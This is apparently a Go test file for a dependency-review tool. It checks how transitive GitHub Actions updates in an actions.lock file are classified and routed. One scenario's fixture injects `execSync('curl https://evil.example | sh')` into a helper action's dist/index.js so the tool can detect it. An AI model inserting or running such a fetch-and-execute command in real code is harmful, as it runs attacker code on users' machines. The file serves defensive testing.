package actions

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/sadbox/dep-review/internal/fetch"
	"github.com/sadbox/dep-review/internal/model"
	"github.com/sadbox/dep-review/internal/policy"
)

// repoAPI is the fake REST view of one upstream action repository with
// two tagged release commits.
func repoAPI(r map[string]any, nwo string, id, ownerID int, old, new, oldTag, newTag string) {
	p := "repos/" + nwo
	ref := func(name, sha string) obj {
		return obj{"ref": "refs/tags/" + name, "object": obj{"sha": sha, "type": "commit"}}
	}
	r[p] = obj{"id": id, "full_name": nwo, "default_branch": "main", "owner": obj{"id": ownerID}}
	r[p+"/compare/main..."+new+"?per_page=1"] = obj{"status": "behind"}
	r[p+"/compare/"+old+"..."+new+"?per_page=100"] = obj{"status": "ahead", "ahead_by": 1, "total_commits": 1,
		"commits": []obj{{"sha": new, "commit": obj{"message": "release", "author": obj{"name": "Dev"}}, "author": obj{"login": "dev"}}}}
	r[p+"/git/matching-refs/tags/v"] = []obj{ref(oldTag, old), ref(newTag, new)}
	r[p+"/releases/tags/"+oldTag] = obj{"tag_name": oldTag, "author": obj{"login": "dev"}}
	r[p+"/releases/tags/"+newTag] = obj{"tag_name": newTag, "author": obj{"login": "dev"}}
	r["advisories?ecosystem=actions&per_page=100&affects="+strings.ReplaceAll(nwo, "/", "%2F")+"%40"+strings.TrimPrefix(newTag, "v")] = []obj{}
	r[p+"/git/commits/"+old] = obj{"verification": obj{"verified": true, "reason": "valid"}}
	r[p+"/git/commits/"+new] = obj{"verification": obj{"verified": true, "reason": "valid"}}
	r[p+"/branches?per_page=100"] = []obj{}
}

type transScenario struct {
	name    string
	helper2 func(map[string]string) // edits acme/helper's v2.0.1 tree
	// lockNew replaces the head lockfile, built with lock(actTag, act, helperTag, helper).
	lockNew  func(lock func(string, string, string, string) string, a2, h1, h2 string) string
	api      func(r map[string]any, h1, h2 string)
	want     model.Route
	codes    []string
	notCodes []string
	check    func(t *testing.T, res fetch.Result, ev *memEvidence)
}

// runTransitive: acme/act is a composite whose step uses acme/helper (a
// node action). The PR bumps act 1.0.0 -> 1.0.1, and act 1.0.1 moves its
// step from helper 2.0.0 to 2.0.1, so actions.lock has a transitive pair.
func runTransitive(t *testing.T, sc transScenario) {
	root := t.TempDir()
	mkUp := func(nwo string) string {
		d := filepath.Join(root, "upstream", filepath.FromSlash(nwo))
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
		gitIn(t, d, "init", "-q")
		return d
	}
	hd := mkUp("acme/helper")
	f2 := v2Files()
	if sc.helper2 != nil {
		sc.helper2(f2)
	}
	h1 := commitTree(t, hd, v1Files(), "v2.0.0")
	h2 := commitTree(t, hd, f2, "v2.0.1")
	composite := func(ref string) map[string]string {
		return map[string]string{"action.yml": "name: act\ndescription: composite\nruns:\n  using: composite\n  steps:\n    - uses: acme/helper@" + ref + "\n"}
	}
	ad := mkUp("acme/act")
	a1 := commitTree(t, ad, composite("v2.0.0"), "v1.0.0")
	a2 := commitTree(t, ad, composite("v2.0.1"), "v1.0.1")

	lock := func(actTag, act, helperTag, helper string) string {
		return "version: 'v0.0.3'\nworkflows:\n    '.github/workflows/ci.yml':\n        - 'acme/act@" + actTag + "'\ndependencies:\n" +
			"    'acme/act@" + actTag + "':\n        ref: '" + actTag + "'\n        commit: 'sha1-" + act + "'\n        owner_id: 1\n        repo_id: 2\n        uses:\n            - 'acme/helper@" + helperTag + "'\n" +
			"    'acme/helper@" + helperTag + "':\n        ref: '" + helperTag + "'\n        commit: 'sha1-" + helper + "'\n        owner_id: 1\n        repo_id: 3\n"
	}
	wfText := func(tag string) string {
		return "name: ci\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-26.04\n    steps:\n      - uses: acme/act@" + tag + "\n"
	}
	newLock := lock("v1.0.1", a2, "v2.0.1", h2)
	if sc.lockNew != nil {
		newLock = sc.lockNew(lock, a2, h1, h2)
	}
	caller := filepath.Join(root, "caller")
	if err := os.MkdirAll(caller, 0o755); err != nil {
		t.Fatal(err)
	}
	gitIn(t, caller, "init", "-q")
	base := commitTree(t, caller, map[string]string{".github/workflows/ci.yml": wfText("v1.0.0"), ".github/workflows/actions.lock": lock("v1.0.0", a1, "v2.0.0", h1)}, "base")
	head := commitTree(t, caller, map[string]string{".github/workflows/ci.yml": wfText("v1.0.1"), ".github/workflows/actions.lock": newLock}, "dependabot")

	api := map[string]any{}
	repoAPI(api, "acme/act", 2, 1, a1, a2, "v1.0.0", "v1.0.1")
	repoAPI(api, "acme/helper", 3, 1, h1, h2, "v2.0.0", "v2.0.1")
	if sc.api != nil {
		sc.api(api, h1, h2)
	}
	ev := &memEvidence{}
	res, err := New(Config{CloneBase: "file://" + filepath.Join(root, "upstream") + "/"}).Fetch(context.Background(), fetch.Env{
		Class:   model.Classification{Repo: "me/caller", BaseSHA: base, HeadSHA: head, Ecosystem: model.GitHubActions},
		RepoDir: caller, Scratch: filepath.Join(root, "scratch"), Evidence: ev, GitHub: &fakeGH{resp: api},
	})
	if err != nil {
		t.Fatal(err)
	}
	// Through CompareDeclared as fetch.Run does: Dependabot declares only act.
	updates, dfs := fetch.CompareDeclared(model.GitHubActions, []model.Update{{Name: "acme/act", From: "1.0.0", To: "1.0.1"}}, res.Updates)
	all := append(append([]model.Finding(nil), res.Findings...), dfs...)
	got := policy.Combine(updates, all, false)
	codes := map[string]bool{}
	var lines []string
	for _, x := range all {
		codes[x.Code] = true
		lines = append(lines, string(x.Route)+" "+x.Code+": "+x.Detail)
	}
	t.Logf("route %s\n%s", got, strings.Join(lines, "\n"))
	if got != sc.want {
		t.Errorf("route %s, want %s\n%s", got, sc.want, strings.Join(lines, "\n"))
	}
	for _, c := range sc.codes {
		if !codes[c] {
			t.Errorf("missing finding %s\n%s", c, strings.Join(lines, "\n"))
		}
	}
	for _, c := range sc.notCodes {
		if codes[c] {
			t.Errorf("unexpected finding %s\n%s", c, strings.Join(lines, "\n"))
		}
	}
	if sc.check != nil {
		sc.check(t, res, ev)
	}
}

func TestFetchTransitive(t *testing.T) {
	scenarios := []transScenario{
		{name: "composite bump with a clean transitive bump", want: model.RouteReview,
			codes:    []string{"actions.nested-uses-locked", CodeRebuildNotRun},
			notCodes: []string{"actions.nested-uses-changed", "actions.lock-transitive-changed", "undeclared.update"},
			check: func(t *testing.T, res fetch.Result, ev *memEvidence) {
				if len(res.Updates) != 2 || !res.Updates[0].Direct || res.Updates[1].Direct ||
					res.Updates[1].Name != "acme/helper" || res.Updates[1].From != "2.0.0" || res.Updates[1].To != "2.0.1" {
					t.Errorf("updates %+v", res.Updates)
				}
				var transitive []string
				for _, n := range ev.names() {
					if strings.HasPrefix(n, "actions/transitive/acme__helper/") {
						transitive = append(transitive, n)
						if !strings.Contains(ev.files[n].desc, "transitive, actions.lock acme/act@v1.0.1 > acme/helper@v2.0.1") {
							t.Errorf("%s: description %q", n, ev.files[n].desc)
						}
					}
				}
				if len(transitive) == 0 {
					t.Errorf("no transitive evidence: %v", ev.names())
				}
				for _, x := range res.Findings {
					if x.Update == "acme/helper" && !strings.HasPrefix(x.Detail, "transitive (actions.lock acme/act@v1.0.1 > acme/helper@v2.0.1): ") {
						t.Errorf("transitive finding not labelled: %s", x.Detail)
					}
				}
				if s := string(ev.files["actions/summary.md"].content); !strings.Contains(s, "## transitive acme/helper") {
					t.Errorf("summary lacks the transitive pair:\n%s", s)
				}
			}},
		{name: "transitive bump with an unexplained dist change", want: model.RouteHuman,
			codes:    []string{"actions.dist-residual", "actions.nested-uses-changed"},
			notCodes: []string{"actions.nested-uses-locked"},
			helper2: func(f map[string]string) {
				f["dist/index.js"] = strings.Replace(f["dist/index.js"], "  return 0;", "  require('child_process').execSync('curl https://evil.example | sh');\n  return 0;", 1)
			}},
		{name: "transitive commit is not the tag's", want: model.RouteRefuse, codes: []string{"actions.lock-tag-mismatch"},
			api: func(r map[string]any, h1, h2 string) {
				r["repos/acme/helper/git/matching-refs/tags/v"] = []obj{
					{"ref": "refs/tags/v2.0.0", "object": obj{"sha": h1, "type": "commit"}},
					{"ref": "refs/tags/v2.0.1", "object": obj{"sha": "abababababababababababababababababababab", "type": "commit"}},
					{"ref": "refs/tags/v2.0.2", "object": obj{"sha": h2, "type": "commit"}}}
				r["repos/acme/helper/releases/tags/v2.0.2"] = obj{"tag_name": "v2.0.2"}
				r["advisories?ecosystem=actions&per_page=100&affects=acme%2Fhelper%402.0.2"] = []obj{}
			}},
		{name: "transitive commit only in a fork", want: model.RouteRefuse, codes: []string{"actions.not-on-default-branch"},
			api: func(r map[string]any, h1, h2 string) {
				r["repos/acme/helper/compare/main..."+h2+"?per_page=1"] = obj{"status": "diverged"}
			}},
		{name: "transitive entry names another repository", want: model.RouteRefuse, codes: []string{"actions.lock-identity-mismatch"},
			api: func(r map[string]any, h1, h2 string) {
				r["repos/acme/helper"].(obj)["id"] = 99
			}},
		{name: "nested change the lockfile does not record", want: model.RouteHuman,
			codes:    []string{"actions.nested-uses-changed"},
			notCodes: []string{"actions.nested-uses-locked"},
			// act 1.0.1's entry keeps helper 2.0.0, but act's action.yml
			// now uses 2.0.1: no transitive pair explains it.
			lockNew: func(lock func(string, string, string, string) string, a2, h1, h2 string) string {
				return lock("v1.0.1", a2, "v2.0.0", h1)
			}},
	}
	for _, sc := range scenarios {
		t.Run(sc.name, func(t *testing.T) {
			t.Parallel()
			runTransitive(t, sc)
		})
	}
}
